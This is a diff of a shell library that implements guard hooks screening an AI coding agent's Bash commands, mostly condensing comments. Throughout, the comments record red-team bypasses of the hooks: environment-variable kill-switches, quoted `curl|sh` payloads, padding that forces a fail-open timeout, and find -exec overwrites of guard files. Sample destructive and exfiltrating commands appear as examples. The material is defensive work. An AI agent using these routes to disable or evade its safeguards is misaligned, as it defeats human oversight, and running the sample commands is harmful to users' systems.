-# target (harbor#1300, #555 P3): the rule is in the covered set, the call runs confined, the operator turned the skip
-# on, and the config dir is outside everything the sandbox lets a command write. Any doubt is 1, and the rule blocks.
-# The set mirrors contracts/confinement-coverage.tsv, and tests/admission/baseline/confinement.test.sh holds the two equal:
-# rules whose whole target is the config dir or a floor surface in it. Never a rule whose target can sit in the write
-# zone or above the config dir, a remote action, or a file tool (the sandbox wraps Bash alone).
-# NOTHING HERE IS READ FROM THE ENVIRONMENT. A project's settings `env` block reaches every hook, so the marker and the
-# managed file are pinned literals (tests drive a copy with them rewritten, as HOST-1 does for scutil), the marker must
-# be root-owned, and the skip is a line only the operator's sudo install writes (`confinement_skip` in harbor.toml):
-# harbor.toml itself sits inside the write zone, so a confined session could turn a skip read from there on itself.
-# Called on the block path only, so its forks never touch an allowed call.
+# floor_confinement_covers <guard> <rule> - 0 iff this block is skipped because the confinement already denies its target (harbor#1300, #555 P3): the rule is in the covered set, the call runs confined, the operator turned the skip on, and the config dir is outside everything the sandbox lets a command write. Any doubt is 1, and the rule blocks.
+# The set mirrors contracts/confinement-coverage.tsv (held equal by tests/admission/baseline/confinement.test.sh): rules whose whole target is the config dir or a floor surface in it; never a rule whose target can sit in the write zone, a remote action, or a file tool.
+# NOTHING HERE IS READ FROM THE ENVIRONMENT (a project's `env` block reaches every hook): the marker and managed file are pinned literals, the marker must be root-owned, and the skip is a line only the operator's sudo install writes (harbor.toml sits in the write zone). Block path only, so its forks never touch an allowed call.
 _FLOOR_CONF_DIRS='/Library/Application Support/ClaudeCode:/etc/claude-code'
 _FLOOR_CONF_UID=0
 _FLOOR_CONF_TMP='/tmp:/private/tmp'   # the temp trees a sandboxed command may write
@@ -1091,44 +687,16 @@ $(printf '%s\n' "$_FLOOR_CONF_TMP" | tr ':' '\n')"
   return 0
 }
 
-# floor_ematch <text> <ERE> — 0 iff text matches the case-insensitive ERE.
-# Portable BSD+GNU: no \b/\s/\d (POSIX classes + explicit boundaries only), and
-# NO mid-pattern `^` inside an alternation — BSD grep silently never matches
-# that alternative, which quietly disabled several rules while they still
-# matched under the GNU grep an interactive shell may resolve first. The
-# interpreter is PINNED to the system grep for the same reason: the floor must
-# behave identically no matter what is early in PATH.
-# An INHERITED FLOOR_GREP/FLOOR_AWK is a second, undocumented kill-switch:
-# FLOOR_GREP=/usr/bin/false makes every rule in every guard return false while
-# the floor still looks installed, pinned and wired (red-team pass 8). The
-# override is honoured only for a real system grep; anything else is ignored.
+# floor_ematch <text> <ERE> - 0 iff text matches the case-insensitive ERE. Portable BSD+GNU: no \b, \s or \d, and NO mid-pattern `^` inside an alternation (BSD grep silently never matches that alternative).
+# The interpreter is PINNED to the system grep: an INHERITED FLOOR_GREP/FLOOR_AWK is an undocumented kill-switch (FLOOR_GREP=/usr/bin/false makes every rule false while the floor looks installed; red-team pass 8). The override is honoured only for a real system grep.
 _fg="${FLOOR_GREP:-}"
-# AND AN ALLOWLISTED PATH IS NOT AN EXECUTABLE ONE (review of harbor#341). The
-# allowlist alone refuses /usr/bin/false but ACCEPTS an allowlisted path that is
-# absent on this host — /opt/homebrew/bin/grep does not exist here — and the
-# interpreter then fails to launch on every call: floor_ematch returns non-zero,
-# every rule reads false, and the floor is off while still looking installed,
-# pinned and wired. Same kill-switch, reached through a different door. `-x` is
-# what closes it; without it the two-line allowlist is theatre.
+# An allowlisted path is not an executable one: one absent on this host would make every rule read false (harbor#341), so `-x` is required.
 case "$_fg" in
   /usr/bin/grep|/bin/grep|/usr/local/bin/grep|/opt/homebrew/bin/grep) [ -x "$_fg" ] || _fg="" ;;
   *) _fg="" ;;
 esac
 FLOOR_GREP="${_fg:-$( [ -x /usr/bin/grep ] && echo /usr/bin/grep || echo grep )}"
-# jq GETS THE SAME TREATMENT, AND DID NOT (measured 2026-08-25). floor_field
-# invoked a BARE `jq`, so it was PATH-only while grep had an absolute fallback
-# two lines up. A hook firing with a stripped PATH therefore lost jq while
-# /usr/bin/jq sat there executable — and this is the failure the comment on
-# floor_field calls the most dangerous in the set, because every field reads
-# empty and an UNWRAPPED guard then sees an empty command and allows anything.
-# Two live wrapper denials at 2026-08-25T05:46:27Z, one tool call across both
-# PreToolUse wirings, with jq present the whole time.
-#
-# THE ALLOWLIST IS NOT OPTIONAL, for the reason spelled out for FLOOR_GREP: an
-# inherited FLOOR_JQ=/usr/bin/false would make every field read empty while the
-# floor still looked installed, pinned and wired — the same undocumented
-# kill-switch red-team pass 8 found, one interpreter to the left. The override is
-# honoured only for a real system jq; anything else is ignored.
+# FLOOR_JQ gets the same treatment: a bare `jq` was lost under a stripped PATH while /usr/bin/jq existed, every field read empty, and an unwrapped guard saw an empty command and allowed anything. Same allowlist, same reason (an inherited FLOOR_JQ=/usr/bin/false would be a kill-switch).
 _fj="${FLOOR_JQ:-}"
 case "$_fj" in
   /usr/bin/jq|/bin/jq|/usr/local/bin/jq|/opt/homebrew/bin/jq) [ -x "$_fj" ] || _fj="" ;;
@@ -1137,15 +705,7 @@ esac
 FLOOR_JQ="${_fj:-$( [ -x /usr/bin/jq ] && echo /usr/bin/jq || echo jq )}"
 floor_ematch() { printf '%s' "$1" | "$FLOOR_GREP" -iEq -- "$2"; }
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Anti-evasion pre-pass for Bash guards (B3/B4). The recon's load-bearing
-# lesson (ported from safety-classifier.ts:213-356): a naive grep over the raw
-# command both false-POSITIVES on inert single-quoted data (echo 'rm -rf /')
-# and false-NEGATIVES on executed quoted args (env bash -c 'curl x | sh') and
-# command substitutions. floor_bash_targets normalizes one command into the
-# NEWLINE-joined set of strings that will actually run, and callers grep each
-# pattern over that set.
-# ─────────────────────────────────────────────────────────────────────────────
+# Anti-evasion pre-pass for Bash guards (B3/B4). A naive grep over the raw command false-POSITIVES on inert single-quoted data and false-NEGATIVES on executed quoted args and command substitutions; floor_bash_targets normalizes one command into the newline-joined set of strings that will actually run, and callers grep each pattern over that set.
 
 # floor_peel <cmd> — strip up to 3 layers of benign prefix wrappers
 # (FOO=bar / sudo / env / nohup / command / exec / timeout N) so a wrapper
@@ -1154,10 +714,7 @@ floor_ematch() { printf '%s' "$1" | "$FLOOR_GREP" -iEq -- "$2"; }
 floor_peel() {
   _c="$1"; _i=0
   while [ "$_i" -lt 3 ]; do
-    # A wrapper requires a COMMAND after it. `env | curl …` is not a wrapped
-    # command, it is a dump piped somewhere — stripping the `env` there erased
-    # the evidence the CRED-05 rule exists to see (B7). So the next token must
-    # start with something that could begin a command, and it is kept.
+    # A wrapper requires a COMMAND after it: `env | curl ...` is a dump piped somewhere, and stripping `env` there erased the evidence the CRED-05 rule needs (B7).
     _p="$(printf '%s' "$_c" | sed -E \
       -e 's/^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*=[^[:space:]]+[[:space:]]+//' \
       -e 's/^[[:space:]]*(sudo|env|nohup|command|builtin|exec|stdbuf|nice|ionice)[[:space:]]+([^[:space:]|&;<>)])/\2/' \
@@ -1168,19 +725,9 @@ floor_peel() {
   printf '%s' "$_c"
 }
 
-# floor_is_executor <cmd> — 0 iff the command hands a (possibly quoted) string
-# to an interpreter, so that quoted string is CODE, not data.
-# The flag test accepts BUNDLED forms (bash -lc, sh -xc, python3 -Ec): requiring
-# -c as its own token let `bash -lc 'curl|sh'` be classified as a non-executor,
-# which then had its payload treated as inert data (red-team 2026-07-24, the
-# highest-impact bypass — it defeated every pattern for every payload).
-# Deliberately PERMISSIVE: this predicate GATES whether the CODE variant is
-# scanned at all, so a miss is total — a live payload becomes dropped data.
-# Two misses were confirmed (red-team pass 2): an absolute-path interpreter
-# (/bin/bash -c) and a flag taking a separate value (zsh -o norc -c). Both are
-# fixed by (a) allowing a leading path and (b) accepting the -c/-e/-r flag
-# ANYWHERE after the interpreter word rather than as an unbroken flag chain.
-# osascript is macOS's only; the Linux forms (python, node, perl) are already listed (harbor#618).
+# floor_is_executor <cmd> - 0 iff the command hands a (possibly quoted) string to an interpreter, so that string is CODE, not data.
+# Deliberately PERMISSIVE: it gates whether the CODE variant is scanned at all, so a miss drops a live payload. The flag test accepts BUNDLED forms (bash -lc, python3 -Ec), a leading path (/bin/bash -c), and -c/-e/-r ANYWHERE after the interpreter word (zsh -o norc -c) (red-team 2026-07-24, pass 2).
+# osascript is macOS's only; the Linux forms are listed (harbor#618).
 floor_is_executor() {
   floor_ematch "$1" '(^|[^[:alnum:]_])(/[a-zA-Z0-9_./-]*/)?(bash|sh|zsh|dash|ksh|busybox)[[:space:]]+([^[:space:]]+[[:space:]]+)*--?[a-zA-Z-]*c([[:space:]]|=|$)' && return 0
   # trap runs its quoted action as eval runs its line, on the signal or at exit (harbor#1313).
@@ -1188,30 +735,9 @@ floor_is_executor() {
   floor_ematch "$1" '(^|[^[:alnum:]_])find([[:space:]]).*-exec' && return 0
   floor_ematch "$1" '(^|[^[:alnum:]_])(/[a-zA-Z0-9_./-]*/)?(python[0-9.]*|node|nodejs|ruby|perl|php|osascript)[[:space:]]+([^[:space:]]+[[:space:]]+)*--?[a-zA-Z-]*(c|e|r)([[:space:]]|=|$)' && return 0
   floor_ematch "$1" '(^|[^[:alnum:]_])(ssh|awk|make|systemd-run|docker|kubectl)([[:space:]])' && return 0
-  # `sed` LEFT THIS LIST (edge pass 2026-08-29). Every other word here hands a
-  # string to a shell; sed does not. Its quoted argument is a SED program, and a
-  # `|` in one is a delimiter or an alternation — never a pipe. Promoting it to
-  # CODE meant `s|rm -rf /|X|` was scanned with shell rules, where the two
-  # delimiters read as pipeline boundaries and rm-rf-root.flat fired on an
-  # ordinary edit to a file documenting that rule. It blocked twice while this
-  # pass was measuring it.
-  #
-  # NOT A WEAKENING, MEASURED RATHER THAN ARGUED. Both shapes that could have
-  # lost cover were run against HEAD and against this file: `sed 's/x/…/e'` and
-  # `sed -n 'w <floor surface>'` are allowed BY BOTH, so neither was coverage
-  # this removed — they are pre-existing gaps, now recorded in docs/explanation/admission-baseline.md rather
-  # than quietly inherited. The write that IS caught, `sed -i '' 's/a/b/'
-  # <surface>`, still blocks after the change, because there the surface is its
-  # own operand and the rule reads it from DATA without ever needing CODE.
-  #
-  # sed reaches a shell through one door, GNU's `e`, so that door keeps the
-  # promotion — as a bound on what this file will hand over, not as a claim that
-  # the payload behind it is caught today. The first assertions written for this
-  # change said it was; running them is what showed otherwise.
-  #
-  # The `e` test errs toward promoting: a non-word character followed by `e` at a
-  # word end covers `s/x/y/e`, `s|x|y|e` and a bare `e cmd`, and costs at most a
-  # spurious promotion, which only ever adds a variant to scan.
+  # `sed` LEFT THIS LIST (edge pass 2026-08-29): its quoted argument is a SED program, where `|` is a delimiter, not a pipe; as CODE, `s|rm -rf /|X|` fired rm-rf-root.flat on ordinary edits.
+  # No cover is lost: `sed 's/x/.../e'` and `sed -n 'w <surface>'` were allowed before and after (pre-existing gaps, in admission-baseline.md), and `sed -i '' 's/a/b/' <surface>` still blocks since the surface is its own operand.
+  # sed reaches a shell only through GNU's `e`, so that keeps the promotion (a bound on what is handed over, not a claim the payload is caught). The `e` test errs toward promoting; the cost is a spurious extra variant.
   floor_ematch "$1" '(^|[^[:alnum:]_])sed([[:space:]])' \
     && floor_ematch "$1" '([^[:alnum:][:space:]]e|(^|[[:space:]])e)([[:space:]]|$)' \
     && return 0
@@ -1228,34 +754,19 @@ floor_is_executor() {
 #   • SUB   — every substitution body, always
 # Executor detection runs on DATA, so a dangerous-looking string inside a
 # commit message cannot promote the command to CODE.
-# An inherited FLOOR_AWK/FLOOR_MAX_NORM is the same class of undocumented
-# kill-switch as FLOOR_GREP: pointing the first at /dev/null or the second at 0
-# disables the anti-evasion pre-pass for every guard, and a project-level
-# settings.json `env` block can set them (privsec FO-03/04/05). Only a real
-# normalizer inside the guard directory is honoured.
+# An inherited FLOOR_AWK/FLOOR_MAX_NORM is the same kill-switch class as FLOOR_GREP (privsec FO-03/04/05): only a real normalizer inside the guard directory is honoured.
 _fa="${FLOOR_AWK:-}"
 [ -n "$_fa" ] && [ ! -s "$_fa" ] && _fa=""
 case "$_fa" in */admission-normalize.awk) ;; *) _fa="" ;; esac
 # harbor#813: no dirname fork for a caller that set no DIR.
 case "${0:-.}" in */*) _fad="${0%/*}" ;; *) _fad=. ;; esac
-# W7 (harbor#949): a deploy ships this library (runtime-install) before the normaliser's new name (admission-install),
-# so between the two only the old name is in bin/. Read it there, named through a variable, until the shim goes (2026-12-01).
-_fan=floor-normalize
-[ -n "$_fa" ] || [ -s "${DIR:-$_fad}/admission-normalize.awk" ] || [ ! -s "${DIR:-$_fad}/$_fan.awk" ] || _fa="${DIR:-$_fad}/$_fan.awk"
 FLOOR_AWK="${_fa:-${DIR:-$_fad}/admission-normalize.awk}"
 
-# floor_expand_vars <text> — substitute simple `NAME=value` assignments made
-# earlier in the SAME command. Every rule requires the dangerous token to sit
-# next to its verb, so splitting it into a variable defeated all of them:
-#   F=$HOME/.claude/settings.json; echo {} > $F     (red-team pass 3)
-# Bounded to 8 assignments; purely additive (the expanded copy is scanned
-# alongside the original, never instead of it).
+# floor_expand_vars <text> - substitute simple `NAME=value` assignments made earlier in the SAME command (`F=$HOME/.claude/settings.json; echo {} > $F`, red-team pass 3): rules need the dangerous token next to its verb. Bounded to 8; purely additive (scanned alongside the original).
 floor_expand_vars() {
   _t="$1"
   case "$_t" in *=*) ;; *) printf '%s' "$_t"; return 0 ;; esac
-  # Assignments, newline-separated. Iterated with `set --` rather than a pipe
-  # so the substitutions accumulate in THIS shell (a `while read` pipeline runs
-  # in a subshell and every expansion was silently discarded).
+  # Iterated with `set --`, not a pipe, so the substitutions accumulate in THIS shell.
   _old="$IFS"; IFS='
 '
   # shellcheck disable=SC2086
@@ -1270,21 +781,8 @@ floor_expand_vars() {
   printf '%s' "$_t"
 }
 
-# floor_expand_paths <text> — rewrite every home spelling to the absolute home
-# and collapse redundant slashes, so path rules match ONE canonical form.
-# Enumerating spellings in each regex kept failing: pass 2 covered `~/` and
-# `$HOME`, pass 5's re-anchoring dropped `~user/` (which the shell expands to
-# the same directory), and every new rule had to re-list them. Normalizing once
-# here is the fix that does not have to be repeated per rule (red-team pass 6).
-#
-# `/x/../` JOINS `//` HERE, through the shared collapse (harbor#94, P13-fs-02).
-# This is the one canonical form every Bash-surface path rule reads — CFG_RE,
-# CFG_TOK, CFGDIR_RE, the segment-table args in floor_seg_has, the archive
-# destinations — and it stopped one collapse short of the file-tool guard's, so
-# `~/Library/../.claude/bin/admission-bash.sh` reached none of them. Fixing it in the
-# canonicaliser rather than in the rules is this function's whole purpose: a
-# `..` clause added to CFG_RE would have to be added to CFG_TOK and to every
-# rule written after it.
+# floor_expand_paths <text> - rewrite every home spelling to the absolute home and collapse redundant slashes, so path rules match ONE canonical form instead of each regex re-listing spellings (`~user/`, `$HOME`; red-team pass 6).
+# `/x/../` joins `//` through the shared collapse (harbor#94, P13-fs-02): this is the form CFG_RE, CFG_TOK, CFGDIR_RE, floor_seg_has args and archive destinations all read, so the fix lives here and not in each rule.
 floor_expand_paths() {
   _fep="$(printf '%s' "$1" | floor_home_sed 2>/dev/null)" || { printf '%s' "$1"; return 0; }
   # A trailing '/.' or '/..' names a directory as surely as '/../' does: '~/..' is the
@@ -1293,39 +791,16 @@ floor_expand_paths() {
   floor_collapse_dots "$_fep"
 }
 
-# Above this size the shell-aware normalizer is skipped. Its char loop builds
-# strings by concatenation, which awk implements in O(n^2): 10KB takes 85ms but
-# 200KB takes 11.7s. A hook that exceeds its timeout is SKIPPED — so padding a
-# dangerous command with junk was a fail-OPEN bypass (QA plan R4, measured).
-# Oversized payloads fall back to scanning the RAW command: cruder, O(n), and
-# fail-toward-BLOCKING — padding now makes a match more likely, not less.
+# Above this size the shell-aware normalizer is skipped: its char loop is O(n^2) in awk (200KB takes 11.7s), and a hook timeout is a SKIPPED hook, so padding was a fail-open bypass (QA plan R4). Oversized payloads fall back to the RAW command: cruder, O(n), fail-toward-BLOCKING.
 case "${FLOOR_MAX_NORM:-}" in
   ''|*[!0-9]*) FLOOR_MAX_NORM=32768 ;;
   *) [ "$FLOOR_MAX_NORM" -lt 4096 ] && FLOOR_MAX_NORM=32768 ;;
 esac
 
-# floor_hd_strip_body <data-line> <raw-cmd> — echo the DATA line with the heredoc BODY
-# removed, or the line unchanged when that cannot be done SAFELY (harbor#302).
-#
-# The false-positive class this exists for: a heredoc body is a document, and the
-# FLAT scanners read it as though it were the command. Measured on this box, the
-# floor blocked eleven pieces of ordinary work in one session on that basis — a
-# commit message quoting a rule name, a ticket body, a probe script, the patch for
-# the rule itself — every one of them defeated by writing identical bytes to a file
-# instead, which is the tell the ticket names.
-#
-# THE OPENER LINE IS EVERYTHING BEFORE THE FIRST " ; ", because admission-normalize.awk
-# joins logical lines with that separator. That is what makes this decidable here
-# and NOT from FLOOR_SEGS: `cat <<HD | sh` puts the shell at segment 2, between the
-# opener and the body, with the delimiter still last, so an index walk cannot see
-# it. The pipe is plainly visible on the DATA line.
-#
-# EVERY GUARD RETURNS THE LINE UNCHANGED. There is no path here that emits less
-# than today unless all three conditions hold, so the failure mode is the status
-# quo rather than a hole.
-#
-# harbor#784: a TYPED ` ; ` is the same three bytes, so the raw opener line is
-# checked too (_floor_hd_line1_clean). <raw> is the command before normalizing.
+# floor_hd_strip_body <data-line> <raw-cmd> - echo the DATA line with the heredoc BODY removed, or unchanged when that cannot be done SAFELY (harbor#302).
+# Why: a heredoc body is a document, but the flat scanners read it as the command (eleven ordinary blocks in one session).
+# The opener line is everything before the first " ; " (admission-normalize.awk's line join); that is decidable here and not from FLOOR_SEGS, since `cat <<HD | sh` puts the shell between opener and body. Every guard returns the line UNCHANGED, so the failure mode is the status quo.
+# harbor#784: a TYPED " ; " is the same three bytes, so the raw opener line is checked too (_floor_hd_line1_clean). <raw> is the command before normalizing.
 _floor_hd_line1_clean() { # <raw> -> 0 iff line 1 is one whole heredoc opener line
   _hdr="${1%%
 *}"
@@ -1353,29 +828,14 @@ floor_hd_strip_body() {
   case "$_hdo" in
     *'|'*|*'&'*|*';'*|*'$('*|*'`'*) printf '%s' "$_hdl"; return 0 ;;
   esac
-  # 2 · THE CONSUMER IS ON AN ALLOW-LIST, NOT OFF A DENY-LIST, and that polarity is
-  # the whole safety argument. A deny-list of interpreters is a claim about a set
-  # you do not control, and the first draft of this proved it: it listed the
-  # obvious shells and script engines and still missed five consumers that execute
-  # a heredoc body while being single simple commands with no pipeline and no
-  # surface name — a remote shell over ssh, a crontab install, an at job, a
-  # makefile read from stdin, and a container exec. Each would have had its body
-  # hidden from the flat scanners while still running. That is the same failure as
-  # the executor word list which killed the previous attempt at this ticket.
-  #
-  # So: only consumers whose stdin cannot execute and whose purpose is writing a
-  # document to a file. Two of them. Anything else keeps being scanned.
+  # 2 - THE CONSUMER IS ON AN ALLOW-LIST, NOT A DENY-LIST: a deny-list of interpreters is a claim about a set you do not control, and missed five consumers that execute a heredoc body (ssh, crontab, at, make, container exec).
+  # Only consumers whose stdin cannot execute and whose purpose is writing a document to a file: cat and tee.
   _hdw="${_hdo%% *}"; _hdw="${_hdw##*/}"
   case "$_hdw" in
     cat|tee) ;;
     *) printf '%s' "$_hdl"; return 0 ;;
   esac
-  # THERE IS DELIBERATELY NO "A REDIRECT MUST BE PRESENT" CONDITION. A draft had
-  # one, requiring `>` on the opener. It cost `tee /tmp/f <<EOF` — which writes to a
-  # file through its ARGUMENT, not a redirect — and bought nothing: `cat <<HD` with
-  # no redirect prints the body to the transcript and executes none of it, and
-  # condition 1 already refuses every pipeline, compound, background and
-  # substitution form, so no unclassified construct survives for it to catch.
+  # Deliberately NO "a redirect must be present" condition: it cost `tee /tmp/f <<EOF` (writes through its ARGUMENT) and bought nothing, since condition 1 already refuses every pipeline, compound and substitution form.
   # 3 · the opener names no floor surface. Substring, not CFG_RE — see the header.
   case "$_hdo" in
     *.claude*|*settings.json*|*hooks/*|*.git/*|*CLAUDE.md*) printf '%s' "$_hdl"; return 0 ;;
@@ -1407,24 +867,8 @@ floor_hd_strip_body() {
     fi
   done
   [ "$_hdfound" = 1 ] || { printf '%s' "$_hdl"; return 0; }
-  # 4 · THE BODY MUST NAME NO FLOOR SURFACE, and this condition exists to KEEP a
-  # decision rather than to close a hole. floor-test:5191 pins "a heredoc into a
-  # FILE is live text to the flat rules whatever it spells — pinned as a pair so
-  # the find spelling and the direct spelling cannot drift". Measured without this
-  # condition, the strip flipped exactly one assertion — "FIND heredoc doc,
-  # direct" from rc2 to rc0 — while its paired find spelling kept blocking, because
-  # the -exec child is a synthesized segment the ARGV layer still reads. The two
-  # spellings would drift, which is what the pair was written to prevent.
-  #
-  # So a body that names the config directory keeps being read as live text. The
-  # false-positive class this ticket is actually about — prose naming a destructive
-  # verb, a rule token, a keychain flag — is unaffected, because none of it
-  # mentions the config dir.
-  #
-  # WHAT THIS DELIBERATELY DOES NOT FIX: documentation whose body quotes a path
-  # inside the config dir still blocks, and in this repo that is ordinary work.
-  # Fixing it means changing the pinned posture, which is a decision and not a
-  # patch.
+  # 4 - THE BODY MUST NAME NO FLOOR SURFACE. This keeps a pinned decision (floor-test: a heredoc into a FILE is live text to the flat rules, pinned as a pair with its find spelling, whose -exec child the ARGV layer still reads); without it the two spellings would drift.
+  # Prose naming a destructive verb or rule token is unaffected. Documentation quoting a path inside the config dir still blocks; changing that changes the pinned posture, which is a decision.
   _hdbody="${_hdl#* ; }"
   case "$_hdbody" in
     *.claude*|*settings.json*|*/hooks/*|*CLAUDE.md*) printf '%s' "$_hdl"; return 0 ;;
@@ -1450,9 +894,7 @@ floor_bash_targets() {
   # simple command, its word is not an interpreter, and it names no floor surface.
   _data="$(floor_hd_strip_body "$_data" "$1")"
   printf '%s\n' "$_data"
-  # Collapse repeated and dot slashes so "rm -rf //" and "rm -rf /./" read as
-  # the root they actually resolve to — the Bash surface had no path
-  # normalization at all, unlike the file-path guard (red-team pass 3).
+  # Collapse repeated and dot slashes so rm -rf // reads as the root it resolves to (red-team pass 3).
   floor_collapse_dots "$_data"; printf '\n'
   # Expand against the UN-peeled text: floor_peel strips a leading `NAME=value`
   # wrapper, which is exactly the assignment the expansion needs to see.
@@ -1463,28 +905,12 @@ floor_bash_targets() {
   _hp="$(floor_expand_paths "$_exp")"
   [ "$_hp" = "$_exp" ] || printf '%s\n' "$_hp"
   printf '%s\n' "$_norm" | sed -n 's/^SUB://p'
-  # EXPD renders substitutions back in place so a rule can see `eval $( … )`
-  # adjacency — both handlers erase `$(` from DATA/CODE, which left the
-  # fetch-and-execute rules structurally unreachable (red-team pass 4).
+  # EXPD renders substitutions back in place so a rule can see `eval $( ... )` adjacency (red-team pass 4).
   printf '%s\n' "$_norm" | sed -n 's/^EXPD://p'
-  # VALU renders each substitution as a guess at its OUTPUT, so an operand that
-  # arrives via `$(printf /)` still sits next to its verb. Without it every
-  # adjacency-based rule broke at once (red-team pass 8, critical).
+  # VALU renders each substitution as a guess at its OUTPUT, so an operand arriving via `$(printf /)` still sits next to its verb (red-team pass 8).
   printf '%s\n' "$_norm" | sed -n 's/^VALU://p'
-  # FEXEC — find's `-exec`/`-ok` children with `{}` substituted back to the
-  # search root (admission-normalize.awk, seg_expand_find). The child is a command
-  # find RUNS, so the flat half of the file has to see it too: `find <cfg>/bin
-  # -name 'guard-*.sh' -exec cp /tmp/evil {} \;` has no surface next to a
-  # mutating verb until the placeholder is resolved, and mutate-onto-surface —
-  # which already knows that a destination-position surface is a write and a
-  # source-position one is a backup — then answers it with no new rule.
-  # ONE LINE PER CHILD, and that is not cosmetic: every flat rule reaches its
-  # operand through a `[^;&|]*` span, and a span that could run out of a real
-  # operand into a synthesized one would manufacture adjacency that the command
-  # does not have. grep is line-oriented, so a line boundary is a wall.
-  # The `case` runs first so a command with no find child costs no fork at all —
-  # the same discipline floor_seg_cwd_under states: a hook that exceeds its
-  # timeout is SKIPPED, so a fork on every call is a fail-open path.
+  # FEXEC: find's `-exec`/`-ok` children with `{}` substituted back to the search root (admission-normalize.awk, seg_expand_find), so the flat rules see what find runs.
+  # ONE LINE PER CHILD: flat rules reach operands through a `[^;&|]*` span, and a span running into a synthesized operand would manufacture adjacency. The `case` runs first so a command with no find child costs no fork (a slow hook is skipped).
   case "$_norm" in
     *"FEXEC:"*)
       _fx="$(printf '%s\n' "$_norm" | sed -n 's/^FEXEC://p')"
@@ -1498,19 +924,8 @@ floor_bash_targets() {
   fi
 }
 
-# ─────────────────────────────────────────────────────────────────────────────
-# H2 (harbor#4) — THE PER-SESSION CONTEXT FILE.
-#
-# floor_session_context — print this session's recorded verdict, or empty.
-# floor_engine_stand_down — exit 0 iff a GLOBAL-ENGINE hook must not act here.
-#
-# ONLY AN EXPLICIT OPT-OUT STANDS THE ENGINE DOWN (harbor#954, D-46). It read
-# "anything but a clear `ambient` ⇒ stand down", so a marker alone, a missing
-# resolver or a first-ever session all stopped the work log in every marked repo,
-# with nothing replacing it. Now the one signal is `worklog: off` at the top level
-# of the .agents/config.yaml whose marker floor_in_repo finds, honoured beside
-# `context: ambient` too: an owner who wrote it meant it. The session verdict no
-# longer decides this; floor_session_context stays for the readers of the file.
+# H2 (harbor#4) - THE PER-SESSION CONTEXT FILE. floor_session_context prints this session's recorded verdict, or empty. floor_engine_stand_down: exit 0 iff a GLOBAL-ENGINE hook must not act here.
+# ONLY AN EXPLICIT OPT-OUT STANDS THE ENGINE DOWN (harbor#954, D-46): `worklog: off` at the top level of the .agents/config.yaml that floor_in_repo finds, honoured beside `context: ambient`. The session verdict no longer decides this.
 floor_session_context() {
   _cx="$(floor_config_dir)/.helm-context"
   _sid="${1:-$(floor_field '.session_id')}"
@@ -1534,30 +949,13 @@ floor_engine_stand_down() {
     "$_wo" 2>/dev/null
 }
 
-# ─────────────────────────────────────────────────────────────────────────────
-# THE SEGMENT-TABLE API (B-rewrite, owner decision 2026-07-25).
-#
-# A rule written against this asks a question about ARGV — "is some segment
-# running `tar` in extract mode with an argument under the config dir?" —
-# instead of a question about spelling — "does this string contain `tar`,
-# followed within N characters by a dash-prefixed group containing x, followed
-# by …". The second question is the one this workstream measured going wrong at
-# 60-85% of the rate it went right.
-#
-# FAIL-OPEN, deliberately and consistently with every other scanner here: if the
-# awk is missing, the payload is oversized, or the table is empty, every
-# predicate below returns "no match". The un-swallowable layer is B1's
-# permissions.deny, which binds the named TOOL and needs no parser at all.
-#
-#   floor_seg_load "$cmd"                       # once per guard invocation
-#   floor_seg_cmd '^(rm|shred)$'                # a segment runs this command
-#   floor_seg_has '^tar$' '^-?[a-z]*x' '/\.claude'   # …AND carries these args
-#   floor_seg_redir '.' '/\.claude/'            # …writes there via redirection
-#
-# Every pattern is an ERE matched against a WHOLE token, so `^…$` anchors mean
-# what they say. Argument patterns are matched against arguments AND redirect
-# targets: a redirect target is an operand of the segment, and `tar -xf p -C
-# ~/.claude` and `cat k > ~/.claude/x` are the same concern.
+# THE SEGMENT-TABLE API (B-rewrite). A rule asks about ARGV (is some segment running `tar` in extract mode with an argument under the config dir?), not about spelling, which went wrong 60-85% as often as right.
+# FAIL-OPEN, like every scanner here: with the awk missing, the payload oversized or the table empty, every predicate returns "no match"; B1's permissions.deny is the backstop.
+#   floor_seg_load "$cmd"   # once per guard invocation
+#   floor_seg_cmd '^(rm|shred)$'   # a segment runs this command
+#   floor_seg_has '^tar$' '^-?[a-z]*x' '/\.claude'   # ...AND carries these args
+#   floor_seg_redir '.' '/\.claude/'   # ...writes there via redirection
+# Every pattern is an ERE on a WHOLE token. Argument patterns match arguments AND redirect targets (`tar -C ~/.claude` and `cat k > ~/.claude/x` are one concern).
 floor_seg_load() { # <cmd>
   FLOOR_SEGS=""
   FLOOR_SEG_CMD="$1"  # harbor#798: the heredoc veto reads the command its table came from
@@ -1570,77 +968,18 @@ floor_seg_load() { # <cmd>
   return 0
 }
 
-# floor_seg_degraded — 0 iff floor_seg_load produced NO table, i.e. every
-# floor_seg_* rule in the calling guard is silently absent for this call.
-#
-# WHY A GUARD HAS TO BE ABLE TO ASK THIS (harbor#306). floor_seg_load and
-# floor_bash_targets degrade in OPPOSITE directions, and only one of them is
-# safe. floor_bash_targets falls back to scanning the RAW command — "cruder,
-# O(n), and fail-toward-BLOCKING", as its own note above says. floor_seg_load
-# falls back to the empty string, so a segment rule that cannot be evaluated
-# reads as a rule that did not match. In a guard carrying BOTH layers
-# (guard-bash) the flat layer covers the gap. In a guard whose rules are
-# segment-ONLY the whole rule set evaporates with exit 0 and no output.
-#
-# MEASURED 2026-08-25 against admission-destroy.sh and admission-cloud.sh, whose
-# deny-always tiers are segment-only. Three causes, one verdict:
-#
-#   a command over FLOOR_MAX_NORM  -> SILENT ALLOW on diskutil eraseDisk
-#   awk absent from PATH           -> SILENT ALLOW
-#   admission-normalize.awk missing    -> SILENT ALLOW
-#
-# with `admission-bash.sh` DENYING the padded 'rm -rf /' alongside it as the control.
-# The first cause needs no missing binary, no missing file and no environment
-# override — a trailing comment of 33,000 bytes is enough, and the same padding
-# makes a guard-bash match MORE likely. So the deny-always tier of a
-# segment-only guard was one long command away from being switched off.
-#
-# THE PREDICATE DISCRIMINATES, which is the only thing that makes it usable
-# (No.2.10). Measured over the ordinary corpus: `ls` 2 segments, `git status` 3,
-# `bq query 'select 1'` 4, a three-stage pipeline 9, a heredoc commit 13 — and a
-# 30 KB command still 3. Every parseable call yields a non-empty table; only the
-# three degraded causes above yield an empty one. An empty table therefore means
-# "could not parse", never "nothing to see".
-#
-# IT IS NOT A RULE AND MUST NOT BECOME ONE. It reports that the argv layer is
-# blind for this call; what a guard does about that belongs to the guard, whose
-# tier structure knows which of its rules were load-bearing. Deciding here would
-# put one posture on every caller, including the ask-tier ones where fail-open is
-# the deliberate §2.11 choice.
